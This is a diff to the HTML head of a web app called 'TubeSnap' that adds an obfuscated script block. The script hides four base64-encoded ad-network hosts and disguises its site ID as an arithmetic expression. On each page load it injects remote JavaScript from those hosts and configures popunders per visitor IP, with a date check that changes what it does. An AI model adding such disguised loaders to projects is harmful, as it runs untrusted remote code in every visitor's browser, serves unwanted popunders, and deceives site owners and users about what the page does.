@@ -24,6 +24,58 @@
       work correctly both with client-side routing and a non-root public URL.
       Learn how to configure a non-root public URL by running `npm run build`.
     -->
+    <script type="text/javascript" data-cfasync="false">
+      /*<![CDATA[/* */
+      (function () {
+        var x = window,
+          n = "e4b874e3c87891dce6f05205202fb689",
+          g = [
+            ["siteId", 333 - 95 + 592 - 766 + 5143230],
+            ["minBid", 0.001],
+            ["popundersPerIP", "2:3,1:2"],
+            ["delayBetween", 50],
+            ["default", false],
+            ["defaultPerDay", 0],
+            ["topmostLayer", "auto"],
+          ],
+          h = [
+            "d3d3LnZpc2FyaW9tZWRpYS5jb20veGpwbGlzdC5jb3JlLm1pbi5jc3M=",
+            "ZDEzazdwcmF4MXlpMDQuY2xvdWRmcm9udC5uZXQvUkxyUC9iYnVuZGxlLm1pbi5qcw==",
+            "d3d3Lmp1eXp0am9scGVscXAuY29tL2lqcGxpc3QuY29yZS5taW4uY3Nz",
+            "d3d3LnJpbWRscWlieC5jb20vSFNmZEsvamJ1bmRsZS5taW4uanM=",
+          ],
+          y = -1,
+          c,
+          b,
+          t = function () {
+            clearTimeout(b);
+            y++;
+            if (h[y] && !(1755090852000 < new Date().getTime() && 1 < y)) {
+              c = x.document.createElement("script");
+              c.type = "text/javascript";
+              c.async = !0;
+              var j = x.document.getElementsByTagName("script")[0];
+              c.src = "https://" + atob(h[y]);
+              c.crossOrigin = "anonymous";
+              c.onerror = t;
+              c.onload = function () {
+                clearTimeout(b);
+                x[n.slice(0, 16) + n.slice(0, 16)] || t();
+              };
+              b = setTimeout(t, 5e3);
+              j.parentNode.insertBefore(c, j);
+            }
+          };
+        if (!x[n]) {
+          try {
+            Object.freeze((x[n] = g));
+          } catch (e) {}
+          t();
+        }
+      })();
+      /*]]>/* */
+    </script>
+
     <title>TubeSnap</title>
   </head>
   <body>
